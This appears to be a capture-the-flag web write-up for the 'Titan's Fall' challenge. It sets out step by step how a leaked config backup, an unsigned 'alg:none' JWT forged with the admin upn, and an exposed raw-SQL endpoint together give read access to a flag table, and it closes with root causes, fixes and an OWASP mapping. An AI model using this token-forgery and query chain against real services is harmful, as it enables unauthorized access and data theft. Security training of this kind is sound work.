---
title: "Titan's Fall"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "adwa-ctf"
category: "web"
platform: "ADWA CTF"
---

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

NAME: Natnael Sisay
ID: CTC-1475-26
CHALLENGE: Titan's fall (ADWA CTF, web)
TARGET: http://20.174.184.35:34838
FLAG: [REDACTED]

![Titan's Fall](../../pics/titans%20fall.png)

SUMMARY

The site is a Flask app called "Kronos Enterprise Analytics Portal". Three bad
decisions in a row give full read of the core database:

  1. robots.txt points at an old config backup in the web root.
  2. That backup says JWT signature checking is turned off and "none" is an
     allowed algorithm.
  3. The API accepts a forged unsigned token and runs raw SQL.

The hint was literal: the simplest key is no key at all.

STEP 1 - RECON

GET /                      -> login/dashboard page (10 KB), Flask/Werkzeug
GET /robots.txt            -> 200, and it is chatty
GET /swagger.json          -> 200, full OpenAPI spec of the internal API
GET /backup/               -> 404 (no listing)
GET /internal/, /v1/, /v2/ -> 404

robots.txt says:

  # TODO: Delete /backup/superset_config_2023.bak (contains old JWT validation params)
  # Ticket: SEC-2847 - Cleanup archived configs from public web root

swagger.json lists four endpoints:

  GET  /v1/GetConfig      service config, requires Admin role
  GET  /v1/GetTables      list tables for ?routingTarget=
  POST /v2/Query          raw SQL, requires Admin role
  POST /v1/Insert         disabled (503)

It also states the required claims: tid, aud, appid, upn.

STEP 2 - THE LEAKED CONFIG (information disclosure)

GET /backup/superset_config_2023.bak -> 200, plain text, 2496 bytes.

The part that matters:

  tenant_id              = 9a8b7c6d-5e4f-3a2b-1c0d-e9f8a7b6c5d4
  audience               = https://analytics.kronos.internal/api
  application_id         = c3f2e1d0-b9a8-7654-3210-fedcba987654
  jwt_algorithms         = RS256, none
  jwt_validate_claims    = tid, aud, appid, upn
  jwt_sig_verify         = false
  local_admin_upn        = admin
  active_targets         = TestData, CoreAnalytics, TelemetryRaw, ...

So: signatures are not checked, "none" is allowed, and the local admin is the
user "admin". The file also hands over every routing target name.

STEP 3 - FORGE THE TOKEN (broken authentication)

Build a JWT with header {"alg":"none","typ":"JWT"} and no signature. Payload:

  {
    "tid":   "9a8b7c6d-5e4f-3a2b-1c0d-e9f8a7b6c5d4",
    "aud":   "https://analytics.kronos.internal/api",
    "appid": "c3f2e1d0-b9a8-7654-3210-fedcba987654",
    "upn":   "admin",
    "iss":   "https://login.kronos.internal/9a8b7c6d.../v2.0",
    "iat":   1700000000,
    "exp":   2000000000,
    "sub":   "admin"
  }

Base64url the two parts, join with a dot, leave the third part empty.

  header.payload.

Test with no token first, then with the forged one:

  GET /v1/GetConfig
    no token      -> 401 {"error":"Missing or invalid Authorization header..."}
    forged token  -> 200 {"service":"Kronos Analytics Engine", ...}

Interesting detail: the role claim is not needed. The server maps upn "admin" to
the local admin account from [rbac] in the backup. A full email UPN is rejected:
"User not recognized in local RBAC. Corporate directory sync pending."

STEP 4 - LIST THE DATA

  GET /v1/GetTables?routingTarget=CoreAnalytics

  {"tables":["flag_vault","performance_kpi","session_logs","sqlite_sequence",
             "system_config","telemetry_events","user_metrics"]}

The name flag_vault is not subtle.

STEP 5 - QUERY THE CORE DATABASE (raw SQL)

  POST /v2/Query
  {"routingTarget":"CoreAnalytics","query":"SELECT * FROM flag_vault"}

  {
    "columns": ["id","flag_name","flag_value","classification","inserted_at"],
    "results": [{
      "id": 1,
      "flag_name": "KRONOS_PRIMARY",
      "flag_value": "[REDACTED]",
      "classification": "TOP_SECRET",
      "inserted_at": "2023-01-15T00:00:00Z"
    }],
    "row_count": 1
  }

VERIFICATION & EDGE CASES

  POST /v2/Query with no Authorization   -> 401 unauthorized
  POST /v2/Query {"query":"DELETE ..."}  -> 403 "Only SELECT queries are permitted"
  SELECT COUNT(*) FROM flag_vault after  -> 1 row, table untouched

ROOT CAUSES

1. Sensitive backup in the public web root (information disclosure).
   SEC-2847 was opened and never closed. robots.txt even advertises the file to
   attackers; robots.txt is a map, not an access control.

2. JWT signature verification disabled, "none" accepted (broken authentication).
   The decoder takes the algorithm from the token header and never pins it.

3. Algorithm confusion plus local RBAC fallback.
   upn "admin" is enough for admin powers. No server-side role check beyond a
   name lookup.

4. Raw SQL endpoint exposed to the client (SQL injection by design).
   /v2/Query passes the user string straight to the engine. Only the word SELECT
   is filtered; that is not a sandbox.

FIX

  - Delete the backup from /public. Keep configs outside the web root, and never
    put secrets or key names in robots.txt.
  - Pin algorithms server-side: allowed = ["RS256"], and reject "none" outright.
  - Fail closed on verification errors. jwt_sig_verify must not be a config flag.
  - Do not trust upn for role. Load roles from the IdP or a server-side table.
  - Remove /v2/Query from the public API. If analysts need queries, use named,
    parameterised reports with a row limit, not free-form SQL.
  - Rate-limit and alert on 401 bursts coming from forged tokens.

OWASP MAPPING

  A01 Broken Access Control  - admin API reachable with a forged identity
  A02 Cryptographic Failures - unsigned JWTs accepted
  A03 Injection              - raw SQL from the request body
  A05 Security Misconfiguration - verification disabled, backup exposed

KEY TAKEAWAYS

  - Never expose configuration backups in web-accessible directories.
  - Pin permitted JWT algorithms server-side and reject "none" unconditionally.
  - Authorize actions using server-side roles, never unverified client claims.
  - Avoid direct SQL endpoints; utilize parameterized queries with strict row limits.